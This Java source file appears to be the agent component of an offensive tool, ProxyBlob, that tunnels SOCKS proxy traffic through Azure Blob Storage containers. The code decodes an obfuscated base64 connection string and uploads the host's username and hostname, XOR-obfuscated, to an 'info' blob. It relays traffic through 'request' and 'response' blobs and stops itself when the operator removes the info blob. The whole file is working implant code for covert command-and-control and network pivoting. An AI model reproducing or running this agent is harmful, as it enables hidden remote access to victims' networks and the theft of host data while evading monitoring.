package com.proxyblob;

import com.azure.storage.blob.BlobClient;
import com.azure.storage.blob.BlobContainerClient;
import com.azure.storage.blob.BlobServiceClient;
import com.azure.storage.blob.BlobServiceClientBuilder;
import com.azure.storage.blob.models.BlobHttpHeaders;
import com.azure.storage.blob.specialized.BlockBlobClient;
import com.proxyblob.protocol.CryptoUtil;
import com.proxyblob.protocol.BaseHandler;
import com.proxyblob.proxy.socks.SocksHandler;
import com.proxyblob.transport.BlobTransport;
import lombok.Getter;

import java.io.ByteArrayInputStream;
import java.net.URI;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

@Getter
public class Agent {

    private final BlobContainerClient container;
    private final BaseHandler baseHandler;
    private final SocksHandler socksHandler;

    private final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();

    private static final byte[] INFO_KEY = new byte[]{(byte) 0xDE, (byte) 0xAD, (byte) 0xB1, 0x0B};
    private static final int HEALTH_CHECK_INTERVAL = 30; // seconds

    public Agent(String encodedConnString) throws Exception {
        URI uri = parseAndValidateUri(encodedConnString);
        this.container = initBlobContainer(uri);
        this.baseHandler = initHandler();
        this.socksHandler = new SocksHandler(baseHandler);
        this.baseHandler.registerPacketHandler(socksHandler);
    }

    public void start() {
        updateInfoBlob();
        baseHandler.start();
        startHealthCheck();
    }

    public void stop() {
        scheduler.shutdownNow();
        baseHandler.stop();
    }

    public void updateInfoBlob() {
        try {
            String info = System.getProperty("user.name") + "@" + java.net.InetAddress.getLocalHost().getHostName();
            byte[] encrypted = CryptoUtil.xor(info.getBytes(StandardCharsets.UTF_8), INFO_KEY);

            BlockBlobClient blob = container.getBlobClient("info").getBlockBlobClient();
            blob.upload(new ByteArrayInputStream(encrypted), encrypted.length, true);
            blob.setHttpHeaders(new BlobHttpHeaders().setContentType("text/plain"));
        } catch (Exception e) {
            throw new RuntimeException("Failed to write info blob", e);
        }
    }

    private URI parseAndValidateUri(String encodedConnString) throws Exception {
        byte[] decodedBytes = Base64.getUrlDecoder().decode(encodedConnString);
        String decoded = new String(decodedBytes, StandardCharsets.UTF_8);
        return new URI(decoded);
    }

    private BlobContainerClient initBlobContainer(URI uri) {
        String containerName = uri.getPath().replaceFirst("/", "");
        String sasToken = URLDecoder.decode(uri.getRawQuery(), StandardCharsets.UTF_8);
        String endpoint = uri.getScheme() + "://" + uri.getHost();

        BlobServiceClient client = new BlobServiceClientBuilder()
                .endpoint(endpoint)
                .sasToken(sasToken)
                .buildClient();

        BlobContainerClient containerClient = client.getBlobContainerClient(containerName);
        if (!containerClient.exists()) {
            throw new IllegalStateException("Container not found: " + containerName);
        }

        return containerClient;
    }

    private BaseHandler initHandler() {
        BlobClient read = container.getBlobClient("request");
        BlobClient write = container.getBlobClient("response");
        return new BaseHandler(new BlobTransport(read, write));
    }

    private void startHealthCheck() {
        scheduler.scheduleAtFixedRate(() -> {
            try {
                if (!container.getBlobClient("info").exists()) {
                    stop();
                    throw new IllegalStateException("Health check failed: 'info' blob not found");
                }
            } catch (Exception e) {
                stop();
                throw new RuntimeException("Health check failed", e);
            }
        }, HEALTH_CHECK_INTERVAL, HEALTH_CHECK_INTERVAL, TimeUnit.SECONDS);
    }
}
